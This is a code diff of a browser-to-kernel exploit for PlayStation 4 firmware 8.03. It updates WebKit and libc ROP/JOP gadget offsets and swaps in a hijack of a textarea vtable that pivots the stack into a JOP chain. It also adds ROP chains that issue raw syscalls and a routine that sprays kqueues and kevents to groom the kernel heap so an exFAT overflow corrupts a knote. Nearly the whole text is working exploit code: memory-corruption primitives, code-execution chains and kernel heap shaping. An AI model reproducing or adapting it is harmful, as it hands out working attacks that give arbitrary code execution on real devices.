@@ -40,18 +40,17 @@ const url = `${origin}:${port}`;
 
 const syscall_array = [];
 
-const offset_func_classinfo = 0x10
 const offset_func_exec = 0x18;
 const offset_textarea_impl = 0x18;
 const offset_js_inline_prop = 0x10;
 
 // WebKit offsets of imported functions
-const offset_wk_stack_chk_fail = 0x8d8;
-const offset_wk_memcpy = 0x918;
+const offset_wk_stack_chk_fail = 0x8D8;
+const offset_wk_memcpy = 0x8E8;
 
 // libSceLibcInternal offsets
-const offset_libc_setjmp = 0x258f4;
-const offset_libc_longjmp = 0x29c58;
+const offset_libc_setjmp = 0x25904;
+const offset_libc_longjmp = 0x29C38;
 
 // see the disassembly of setjmp() from the dump of libSceLibcInternal.sprx
 //
@@ -74,6 +73,7 @@ let libkernel_base = null;
 let libc_base = null;
 
 // gadgets for the JOP chain
+// jop1 was previously used by the old implementation of Chain803, now unused
 const jop1 = `
 mov rdi, qword ptr [rdi + 0x30]
 mov rax, qword ptr [rdi]
@@ -92,11 +92,33 @@ call qword ptr [rax + 0x10]
 `;
 const jop4 = `
 push rdx
-mov edi, 0xac9784fe
 jmp qword ptr [rax]
 `;
 const jop5 = 'pop rsp; ret';
 
+// Why these JOP chain gadgets are not named jop1-3 and jop2-5 not jop4-7 is
+// because jop1-5 was the original chain used by the old implementation of
+// Chain803. Now the sequence is ta_jop1-3 then to jop2-5.
+//
+// When the scrollLeft getter native function is called on PS4 8.03, rsi is the
+// JS wrapper for the WebCore textarea class.
+const ta_jop1 = `
+mov rdi, qword ptr [rsi + 0x18]
+mov rax, qword ptr [rdi]
+call qword ptr [rax + 0xb8]
+`;
+const ta_jop2 = `
+pop rsi
+jmp qword ptr [rax + 0x60]
+`;
+const ta_jop3 = `
+mov rdi, qword ptr [rax + 8]
+mov rax, qword ptr [rdi]
+jmp qword ptr [rax + 0x68]
+`;
+
+// the ps4 firmware is compiled to use rbp as a frame pointer
+//
 // The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
 // must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
 // restore rbp (if needed) before the epilogue.
@@ -110,51 +132,56 @@ const jop5 = 'pop rsp; ret';
 const rop_epilogue = 'leave; ret';
 
 const webkit_gadget_offsets = new Map(Object.entries({
-    'pop rax; ret' : 0x0000000000035a1b,
-    'pop rbx; ret' : 0x000000000001537c,
-    'pop rcx; ret' : 0x0000000000025ecb,
-    'pop rdx; ret' : 0x0000000000060f52,
+    'pop rax; ret' : 0x000000000001ac7b,
+    'pop rbx; ret' : 0x000000000000c46d,
+    'pop rcx; ret' : 0x000000000001ac5f,
+    'pop rdx; ret' : 0x0000000000282ea2,
 
     'pop rbp; ret' : 0x00000000000000b6,
-    'pop rsi; ret' : 0x000000000003bd77,
-    'pop rdi; ret' : 0x00000000001e3f87,
-    'pop rsp; ret' : 0x00000000000bf669,
+    'pop rsi; ret' : 0x0000000000050878,
+    'pop rdi; ret' : 0x0000000000091afa,
+    'pop rsp; ret' : 0x0000000000073c2b,
 
-    'pop r8; ret' : 0x0000000000097442,
-    'pop r9; ret' : 0x00000000006f501f,
-    'pop r10; ret' : 0x0000000000060f51,
-    'pop r11; ret' : 0x0000000000d2a629,
+    'pop r8; ret' : 0x000000000003b4b3,
+    'pop r9; ret' : 0x00000000010f372f,
+    'pop r10; ret' : 0x0000000000b1a721,
+    'pop r11; ret' : 0x0000000000eaba69,
 
-    'pop r12; ret' : 0x0000000000d8968d,
-    'pop r13; ret' : 0x00000000016ccff1,
-    'pop r14; ret' : 0x000000000003bd76,
-    'pop r15; ret' : 0x00000000002499df,
+    'pop r12; ret' : 0x00000000004abe58,
+    'pop r13; ret' : 0x00000000019a0d8b,
+    'pop r14; ret' : 0x0000000000050877,
+    'pop r15; ret' : 0x0000000000091af9,
 
     'ret' : 0x0000000000000032,
-    'leave; ret' : 0x0000000000291fd7,
+    'leave; ret' : 0x000000000001ba53,
 
-    'neg rax; and rax, rcx; ret' : 0x0000000000e85f24,
-    'adc esi, esi; ret' : 0x000000000088cbb9,
-    'add rax, rdx; ret' : 0x00000000003cd92c,
-    'push rsp; jmp qword ptr [rax]' : 0x0000000001abbc92,
-    'add rcx, rsi; and rdx, rcx; or rax, rdx; ret' : 0x0000000000b8bc06,
-    'pop rdi; jmp qword ptr [rax + 0x50]' : 0x00000000021f9e8e,
+    'neg rax; and rax, rcx; ret' : 0x00000000014c5ab4,
+    'adc esi, esi; ret' : 0x0000000000bcfa29,
+    'add rax, rdx; ret' : 0x0000000000d26d4c,
+    'push rsp; jmp qword ptr [rax]' : 0x0000000001e3cb0a,
+    'add rcx, rsi; and rdx, rcx; or rax, rdx; ret' : 0x00000000015a74c6,
+    'pop rdi; jmp qword ptr [rax + 0x1d]' : 0x00000000021f4f09,
 
-    'mov qword ptr [rdi], rsi; ret' : 0x0000000000034a40,
-    'mov rax, qword ptr [rax]; ret' : 0x000000000002dc62,
-    'mov qword ptr [rdi], rax; ret' : 0x000000000005b1bb,
-    'mov rdx, rcx; ret' : 0x0000000000eae9fd,
+    'mov qword ptr [rdi], rsi; ret' : 0x000000000018f010,
+    'mov rax, qword ptr [rax]; ret' : 0x000000000003734c,
+    'mov qword ptr [rdi], rax; ret' : 0x000000000001433b,
+    'mov dword ptr [rdi], eax; ret' : 0x0000000000008e7f,
+    'mov rdx, rcx; ret' : 0x0000000000f2c94d,
 
-    [jop1] : 0x000000000028a8d0,
-    [jop2] : 0x000000000076b970,
-    [jop3] : 0x0000000000202698,
-    [jop4] : 0x00000000021af6ad,
+    [jop1] : 0x000000000174d3e0,
+    [jop2] : 0x00000000011c9df0,
+    [jop3] : 0x0000000000481769,
+    [jop4] : 0x00000000021f10fd,
+
+    [ta_jop1] : 0x0000000000c42d34,
+    [ta_jop2] : 0x00000000021f930e,
+    [ta_jop3] : 0x0000000001236532,
 }));
 
 const libc_gadget_offsets = new Map(Object.entries({
-    'neg rax; ret' : 0x00000000000d3503,
-    'mov rdx, rax; xor eax, eax; shl rdx, cl; ret' : 0x00000000000ce436,
-    'mov qword ptr [rsi], rcx; ret' : 0x00000000000cede2,
+    'neg rax; ret' : 0x00000000000d3df3,
+    'mov rdx, rax; xor eax, eax; shl rdx, cl; ret' : 0x00000000000cef39,
+    'mov qword ptr [rsi], rcx; ret' : 0x00000000000cf8e2,
     'setjmp' : offset_libc_setjmp,
     'longjmp' : offset_libc_longjmp,
 }));
@@ -195,93 +222,17 @@ function init_gadget_map(gadget_map, offset_map, base_addr) {
     }
 }
 
-// Creates a JSValue with the supplied 64-bit argument
-//
-// JSValues are 64-bit integers representing a JavaScript value (primitives and
-// objects), but not all possible 64-bit values are JSValues. So be careful in
-// using this value in situations expecting a valid JSValue.
-//
-// See WebKit/Source/JavaScriptCore/runtime/JSCJSValue.h at webkitgtk 2.34.4.
-// Look for USE(JSVALUE64) since the PS4 platform is 64-bit.
-function create_jsvalue(value) {
-    // Small enough object so that the "value" property is inlined, it is not
-    // at the butterfly.
-    const res = {value : 0};
-    // change the inlined JSValue
-    mem.addrof(res).write64(offset_js_inline_prop, value);
-    return res.value;
-}
-
-// We create a JSFunction clone of eval(). Built-in functions have function
-// pointers we can overwrite for code execution. We creates clones instead of
-// modifying a built-in, so that multiple ROP chains do not need to share the
-// same function.
-function create_builtin() {
-    function func() {}
-
-    // JSC::JSFunction
-    const js_func = mem.addrof(func);
-    // eval() is a built-in function
-    const js_func_eval = mem.addrof(eval);
-
-    // We need to copy eval()'s JSC::ClassInfo for the JavaScript VM to accept
-    // the function as built-in.
-    js_func.write64(
-        offset_func_classinfo,
-        js_func_eval.read64(offset_func_classinfo)
-    );
-    // Clone eval()'s m_executableOrRareData (type is JSC::NativeExecutable
-    // since eval() is a built-in). Its size is 0x58 for PS4 8.03.
-    const exec = make_buffer(js_func_eval.readp(offset_func_exec), 0x58);
-    const exec_view = new Uint8Array(exec.slice(0));
-    const exec_view_vector = get_view_vector(exec_view);
-
-    js_func.write64(offset_func_exec, exec_view_vector);
-    // Maintain a reference to the view of the cloned m_executableOrRareData or
-    // it will be garbage collected.
-    func.exec = exec_view;
-
-    return func;
-}
-
-// Chain for PS4 8.03
-class Chain803 extends ChainBase {
+class Chain803Base extends ChainBase {
     constructor() {
         super();
-
-        // for the JOP chain
-        const rax_ptrs = new Uint8Array(0x100);
-        const rax_ptrs_p = get_view_vector(rax_ptrs);
-        this.rax_ptrs = rax_ptrs;
-
-        rw.write64(rax_ptrs, 8, this.get_gadget(jop2));
-        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop3));
-        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
-        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
-        // value to pivot rsp to
-        rw.write64(this.rax_ptrs, 0x18, this.stack_addr);
-
-        const jop_buffer = new Uint8Array(8);
-        const jop_buffer_p = get_view_vector(jop_buffer);
-        this.jop_buffer = jop_buffer;
-
-        rw.write64(jop_buffer, 0, rax_ptrs_p);
-
-        this.func = create_builtin();
-        // JSC::JSFunction::m_executableOrRareData
-        const func_exec = mem.addrof(this.func).readp(offset_func_exec)
-        this.func_argument = create_jsvalue(jop_buffer_p);
-
-        // JSC::NativeExecutable::m_function
-        func_exec.write64(0x38, this.get_gadget(jop1));
 
         // for conditional jumps
         this._clean_branch_ctx();
         this.flag = new Uint8Array(8);
         this.flag_addr = get_view_vector(this.flag);
-        this.jmp_target1 = new Uint8Array(0x100);
-        rw.write64(this.jmp_target1, 0x50, this.get_gadget(jop4));
-        rw.write64(this.jmp_target1, 0, this.get_gadget(jop5));
+        this.jmp_target = new Uint8Array(0x100);
+        rw.write64(this.jmp_target, 0x1d, this.get_gadget(jop4));
+        rw.write64(this.jmp_target, 0, this.get_gadget(jop5));
 
         // for save/restore
         this.is_saved = false;
@@ -290,13 +241,9 @@ class Chain803 extends ChainBase {
         this.jmp_buf_p = get_view_vector(this.jmp_buf);
     }
 
-    run() {
-        this.check_stale();
-        this.check_is_empty();
-        this.check_is_branching();
-
-        // jump to JOP chain
-        this.func(this.func_argument);
+    // sequence to pivot back and return
+    push_end() {
+        this.push_gadget(rop_epilogue);
     }
 
     check_is_branching() {
@@ -324,6 +271,7 @@ class Chain803 extends ChainBase {
     clean() {
         super.clean();
         this._clean_branch_ctx();
+        this.is_saved = false;
     }
 
     // Use start_branch() and end_branch() to delimit a ROP chain that will
@@ -429,8 +377,8 @@ class Chain803 extends ChainBase {
         //
         // rsp = rdx
         this.push_gadget('pop rax; ret');
-        this.push_value(get_view_vector(this.jmp_target1));
-        this.push_gadget('pop rdi; jmp qword ptr [rax + 0x50]');
+        this.push_value(get_view_vector(this.jmp_target));
+        this.push_gadget('pop rdi; jmp qword ptr [rax + 0x1d]');
         this.push_constant(0); // padding for the push
 
         this.rsp_position = this.branch_position;
@@ -480,8 +428,8 @@ class Chain803 extends ChainBase {
 
         this.push_call(this.get_gadget('longjmp'), this.jmp_buf_p);
 
-        // Padding as longjmp() pushes the restored rdi and the return address
-        // at the target rsp.
+        // Padding as longjmp() pushes the rdi and return address in the
+        // jmp_buf at the target rsp.
         this.push_constant(0);
         this.push_constant(0);
         const target_rsp = this.stack_addr.add(this.position);
@@ -502,7 +450,7 @@ class Chain803 extends ChainBase {
         }
         this.push_call(...args);
         this.push_get_retval();
-        this.push_gadget('leave; ret');
+        this.push_end();
         this.run();
         this.clean();
     }
@@ -513,16 +461,74 @@ class Chain803 extends ChainBase {
         }
         this.push_syscall(...args);
         this.push_get_retval();
-        this.push_gadget('leave; ret');
+        this.push_end();
         this.run();
         this.clean();
     }
 }
+
+// Chain for PS4 8.03
+class Chain803 extends Chain803Base {
+    constructor() {
+        super();
+
+        const textarea = document.createElement('textarea');
+        this.textarea = textarea;
+        const js_ta = mem.addrof(textarea);
+        const webcore_ta = js_ta.readp(0x18);
+        this.webcore_ta = webcore_ta;
+        // We don't need to try and replicate the entire vtable, only offset
+        // 0x1c8 will be used when calling the scrollLeft getter native
+        // function (our tests don't crash). So the rest of the vtable are free
+        // for our use.
+        const vtable = new Uint8Array(0x400);
+        const old_vtable_p = webcore_ta.readp(0);
+        this.vtable = vtable;
+        this.old_vtable_p = old_vtable_p;
+
+        // 0x1c8 is the offset of the scrollLeft getter native function
+        rw.write64(vtable, 0x1c8, this.get_gadget(ta_jop1));
+        rw.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
+        rw.write64(vtable, 0x60, this.get_gadget(ta_jop3));
+
+        // for the JOP chain
+        const rax_ptrs = new Uint8Array(0x100);
+        const rax_ptrs_p = get_view_vector(rax_ptrs);
+        this.rax_ptrs = rax_ptrs;
+
+        //rw.write64(rax_ptrs, 8, this.get_gadget(jop2));
+        rw.write64(rax_ptrs, 0x68, this.get_gadget(jop2));
+        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop3));
+        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
+        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
+        // value to pivot rsp to
+        rw.write64(this.rax_ptrs, 0x18, this.stack_addr);
+
+        const jop_buffer = new Uint8Array(8);
+        const jop_buffer_p = get_view_vector(jop_buffer);
+        this.jop_buffer = jop_buffer;
+
+        rw.write64(jop_buffer, 0, rax_ptrs_p);
+
+        rw.write64(vtable, 8, jop_buffer_p);
+    }
+
+    run() {
+        this.check_stale();
+        this.check_is_empty();
+        this.check_is_branching();
+
+        // change vtable
+        this.webcore_ta.write64(0, get_view_vector(this.vtable));
+        // jump to JOP chain
+        this.textarea.scrollLeft;
+        // restore vtable
+        this.webcore_ta.write64(0, this.old_vtable_p);
+    }
+}
 const Chain = Chain803;
 
-function rop() {
-    const jmp_buf = new Uint8Array(jmp_buf_size);
-    const jmp_buf_p = get_view_vector(jmp_buf);
+function init(Chain) {
     [libwebkit_base, libkernel_base, libc_base] = get_bases();
 
     init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
@@ -531,6 +537,13 @@ function rop() {
     debug_log('syscall_array:');
     debug_log(syscall_array);
     Chain.init_class(gadgets, syscall_array);
+}
+
+function rop(Chain) {
+    const jmp_buf = new Uint8Array(jmp_buf_size);
+    const jmp_buf_p = get_view_vector(jmp_buf);
+
+    init(Chain);
 
     setjmp_addr = gadgets.get('setjmp');
     longjmp_addr = gadgets.get('longjmp');
@@ -550,7 +563,7 @@ function rop() {
     chain.end_branch();
 
     debug_log(`endif chain addr: ${chain.stack_addr.add(chain.position)}`);
-    chain.push_gadget('leave; ret');
+    chain.push_end();
 
     // The ROP chain is a noop. If we crashed, then we did something wrong.
     alert('chain run');
@@ -578,7 +591,7 @@ function rop() {
     chain.push_gadget('pop rcx; ret');
     chain.push_constant(1);
     chain.push_gadget('mov qword ptr [rsi], rcx; ret');
-    chain.push_gadget('leave; ret');
+    chain.push_end();
 
     chain.end_branch();
 
@@ -586,7 +599,7 @@ function rop() {
     chain.push_gadget('pop rcx; ret');
     chain.push_constant(2);
     chain.push_gadget('mov qword ptr [rsi], rcx; ret');
-    chain.push_gadget('leave; ret');
+    chain.push_end();
 
     chain.run();
     debug_log(`state1 must be 1: ${state1}`);
@@ -610,7 +623,7 @@ function rop() {
     chain.push_gadget('pop rcx; ret');
     chain.push_constant(1);
     chain.push_gadget('mov qword ptr [rsi], rcx; ret');
-    chain.push_gadget('leave; ret');
+    chain.push_end();
 
     chain.end_branch();
 
@@ -618,7 +631,7 @@ function rop() {
     chain.push_gadget('pop rcx; ret');
     chain.push_constant(2);
     chain.push_gadget('mov qword ptr [rsi], rcx; ret');
-    chain.push_gadget('leave; ret');
+    chain.push_end();
 
     chain.run();
     debug_log(`state2 must be 2: ${state2}`);
@@ -641,4 +654,119 @@ function rop() {
     }
 }
 
-rop();
+// malloc/free until the heap is shaped in a certain way, such that the exFAT
+// heap oveflow bug overwrites a knote
+function trigger_oob() {
+    const chain = new Chain();
+
+    const num_kqueue = 0x1b0;
+    const kqueues = new Uint32Array(num_kqueue);
+    const kqueues_p = get_view_vector(kqueues);
+
+    for (let i = 0; i < num_kqueue; i++) {
+        chain.push_syscall('kqueue');
+        chain.push_gadget('pop rdi; ret');
+        chain.push_value(kqueues_p.add(i * 4));
+        chain.push_gadget('mov dword ptr [rdi], eax; ret');
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+
+    const AF_INET = 2;
+    const SOCK_STREAM = 1;
+    // socket file descriptor
+    chain.syscall('socket', AF_INET, SOCK_STREAM, 0);
+    const sd = chain.return_value;
+    // pOOBs4 wasn't checking the upper 32 bits of the Int but they probably
+    // meant to. They probably want 0x100 <= sd < 0x200 and not allow something
+    // like sd == 0x1_0000_0100.
+    //
+    // We suspect why they want a specific file descriptor is because
+    // kqueue_expand() allocates memory whose size depends on the file
+    // descriptor number.
+    //
+    // The specific malloc size is probably a part in their method in shaping
+    // the heap.
+    if (sd.low() < 0x100 || sd.low() >= 0x200 || sd.high() !== 0) {
+        die(`invalid socket: ${sd}`);
+    }
+    debug_log(`socket descriptor: ${sd}`);
+
+    // spray kevents
+    const kevent = new Uint8Array(0x20);
+    const kevent_p = get_view_vector(kevent);
+    kevent_p.write64(0, sd);
+    // EV_ADD and EVFILT_READ
+    kevent_p.write32(0x8, 0x1ffff);
+    kevent_p.write32(0xc, 0);
+    kevent_p.write64(0x10, Int.Zero);
+    kevent_p.write64(0x18, Int.Zero);
+
+    for (let i = 0; i < num_kqueue; i++) {
+        // nchanges == 1, everything else is NULL/0
+        chain.push_syscall('kevent', kqueues[i], kevent_p, 1, 0, 0, 0);
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+
+    // fragment memory
+    for (let i = 18; i < num_kqueue; i += 2) {
+        chain.push_syscall('close', kqueues[i]);
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+
+    // trigger OOB
+    alert('insert USB');
+
+    // trigger corrupt knote
+    for (let i = 1; i < num_kqueue; i += 2) {
+        chain.push_syscall('close', kqueues[i]);
+    }
+    chain.push_end();
+    chain.run();
+    chain.clean();
+
+    alert('no kernel panic');
+}
+
+function test_rop(Chain) {
+    init(Chain);
+
+    const chain = new Chain();
+
+    chain.push_end();
+
+    // The ROP chain is a noop. If we crashed, then we did something wrong.
+    alert('chain run');
+    debug_log('test noop chain');
+    chain.run()
+    alert('returned successfully');
+    debug_log('returned successfully');
+
+    debug_log('test syscall getuid()');
+    chain.clean();
+    // Set the return value to some random value. If the syscall worked, then
+    // it will likely change.
+    const magic = 0x4b435546;
+    rw.write32(chain._return_value, 0, magic);
+
+    chain.syscall('getuid');
+
+    debug_log(`return value: ${chain.return_value}`);
+    // return value must also not be 0
+    if (chain.return_value.low() === magic) {
+        die('syscall getuid failed');
+    }
+}
+
+function kexploit() {
+    init(Chain);
+    trigger_oob();
+}
+
+
+test_rop(Chain);
